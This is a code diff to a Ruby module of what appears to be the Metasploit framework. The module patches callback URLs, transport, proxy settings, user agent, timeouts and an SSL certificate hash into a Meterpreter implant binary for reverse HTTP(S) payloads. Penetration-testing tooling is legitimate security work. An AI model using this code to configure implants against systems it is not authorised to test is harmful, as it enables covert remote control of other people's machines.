@@ -11,29 +11,23 @@ module Rex
       module Patch
 
         # Replace the transport string
-        def self.patch_transport! blob, ssl
-
-          i = blob.index("METERPRETER_TRANSPORT_SSL")
-          if i
-            str = ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
-            blob[i, str.length] = str
-          end
-
+        def self.patch_transport!(blob, ssl)
+          str = ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
+          patch_string!(blob, "METERPRETER_TRANSPORT_SSL", str)
         end
 
         # Replace the URL
-        def self.patch_url! blob, url
-
-          i = blob.index("https://" + ("X" * 256))
-          if i
-            str = url
-            blob[i, str.length] = str
+        def self.patch_url!(blob, url)
+          unless patch_string!(blob, "https://#{'X' * 512}", url)
+            # If the patching failed this could mean that we are somehow
+            # working with outdated binaries, so try to patch with the
+            # old stuff.
+            patch_string!(blob, "https://#{'X' * 256}", url)
           end
-
         end
 
         # Replace the session expiration timeout
-        def self.patch_expiration! blob, expiration
+        def self.patch_expiration!(blob, expiration)
 
           i = blob.index([0xb64be661].pack("V"))
           if i
@@ -44,7 +38,7 @@ module Rex
         end
 
         # Replace the session communication timeout
-        def self.patch_comm_timeout! blob, comm_timeout
+        def self.patch_comm_timeout!(blob, comm_timeout)
 
           i = blob.index([0xaf79257f].pack("V"))
           if i
@@ -55,81 +49,110 @@ module Rex
         end
 
         # Replace the user agent string with our option
-        def self.patch_ua! blob, ua
-
-          ua = ua[0,255] + "\x00"
-          i = blob.index("METERPRETER_UA\x00")
-          if i
-            blob[i, ua.length] = ua
-          end
-
+        def self.patch_ua!(blob, ua)
+          patch_string!(blob, "METERPRETER_UA\x00", ua[0,255] + "\x00")
         end
 
         # Activate a custom proxy
-        def self.patch_proxy! blob, proxyhost, proxyport, proxy_type
+        def self.patch_proxy!(blob, proxyhost, proxyport, proxy_type)
 
-          i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-          if i
-            if proxyhost
-              if proxyhost.to_s != ""
-                proxyhost = proxyhost.to_s
-                proxyport = proxyport.to_s || "8080"
-                proxyinfo = proxyhost + ":" + proxyport
-                if proxyport == "80"
-                  proxyinfo = proxyhost
-                end
-                if proxy_type.to_s == 'HTTP'
-                  proxyinfo = 'http://' + proxyinfo
-                else #socks
-                  proxyinfo = 'socks=' + proxyinfo
-                end
-                proxyinfo << "\x00"
-                blob[i, proxyinfo.length] = proxyinfo
-              end
+          if proxyhost && proxyhost.to_s != ""
+            proxyhost = proxyhost.to_s
+            proxyport = proxyport.to_s || "8080"
+            proxyinfo = proxyhost + ":" + proxyport
+            if proxyport == "80"
+              proxyinfo = proxyhost
             end
+            if proxy_type.to_s == 'HTTP'
+              proxyinfo = 'http://' + proxyinfo
+            else #socks
+              proxyinfo = 'socks=' + proxyinfo
+            end
+            proxyinfo << "\x00"
+            patch_string!(blob, "METERPRETER_PROXY#{"\x00" * 10}", proxyinfo)
           end
-
         end
 
         # Proxy authentification
-        def self.patch_proxy_auth! blob, proxy_username, proxy_password, proxy_type
+        def self.patch_proxy_auth!(blob, proxy_username, proxy_password, proxy_type)
 
           unless (proxy_username.nil? or proxy_username.empty?) or
             (proxy_password.nil? or proxy_password.empty?) or
             proxy_type == 'SOCKS'
 
-            proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-            proxy_username = proxy_username << "\x00"
-            blob[proxy_username_loc, proxy_username.length] = proxy_username
+            patch_string!(blob, "METERPRETER_USERNAME_PROXY#{"\x00" * 10}",
+                          proxy_username + "\x00")
 
-            proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-            proxy_password = proxy_password << "\x00"
-            blob[proxy_password_loc, proxy_password.length] = proxy_password
+            patch_string!(blob, "METERPRETER_PASSWORD_PROXY#{"\x00" * 10}",
+                          proxy_password + "\x00")
           end
 
         end
 
-        # Patch options into metsrv for reverse HTTP payloads
-        def self.patch_passive_service! blob, options
+        # Patch the ssl cert hash
+        def self.patch_ssl_check!(blob, ssl_cert_hash)
+          # SSL cert location is an ASCII string, so no need for
+          # WCHAR support
+          if ssl_cert_hash
+            i = blob.index("METERPRETER_SSL_CERT_HASH\x00")
+            if i
+              blob[i, ssl_cert_hash.length] = ssl_cert_hash
+            end
+          end
+        end
 
-          patch_transport! blob, options[:ssl]
-          patch_url! blob, options[:url]
-          patch_expiration! blob, options[:expiration]
-          patch_comm_timeout! blob, options[:comm_timeout]
-          patch_ua! blob, options[:ua]
+        # Patch options into metsrv for reverse HTTP payloads
+        def self.patch_passive_service!(blob, options)
+
+          patch_transport!(blob, options[:ssl])
+          patch_url!(blob, options[:url])
+          patch_expiration!(blob, options[:expiration])
+          patch_comm_timeout!(blob, options[:comm_timeout])
+          patch_ua!(blob, options[:ua])
+          patch_ssl_check!(blob, options[:ssl_cert_hash])
           patch_proxy!(blob,
-            options[:proxyhost],
-            options[:proxyport],
+            options[:proxy_host],
+            options[:proxy_port],
             options[:proxy_type]
           )
           patch_proxy_auth!(blob,
-            options[:proxy_username],
-            options[:proxy_password],
+            options[:proxy_user],
+            options[:proxy_pass],
             options[:proxy_type]
           )
 
         end
 
+        #
+        # Patch an ASCII value in the given payload. If not found, try WCHAR instead.
+        #
+        def self.patch_string!(blob, search, replacement)
+          result = false
+
+          i = blob.index(search)
+          if i
+            blob[i, replacement.length] = replacement
+            result = true
+          else
+            i = blob.index(wchar(search))
+            if i
+              r = wchar(replacement)
+              blob[i, r.length] = r
+              result = true
+            end
+          end
+
+          result
+        end
+
+        private
+
+        #
+        # Convert the given ASCII string into a WCHAR string (dumb, but works)
+        #
+        def self.wchar(str)
+          str.to_s.unpack("C*").pack("v*")
+        end
       end
     end
   end
